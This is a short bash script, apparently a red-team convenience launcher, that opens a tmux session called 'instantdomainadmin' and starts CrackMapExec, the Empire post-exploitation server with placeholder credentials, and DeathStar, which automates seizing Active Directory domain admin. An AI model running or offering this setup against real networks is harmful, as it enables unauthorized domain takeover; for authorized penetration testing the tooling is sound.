#!/bin/bash
tmux new-session -d -s instantdomainadmin ;
tmux send-keys -t instantdomainadmin "crackmapexec | less "  C-m
tmux new-window \;
tmux split-window -h ;
tmux select-pane -L
tmux send-keys -t instantdomainadmin "cd /opt/Empire && ./empire --rest --username username --password password" C-m
tmux select-pane -R
tmux send-keys -t instantdomainadmin "sleep 10 && cd /opt/DeathStar && python3 ./DeathStar.py -u username -p password "  C-m
tmux attach-session -d -t instantdomainadmin
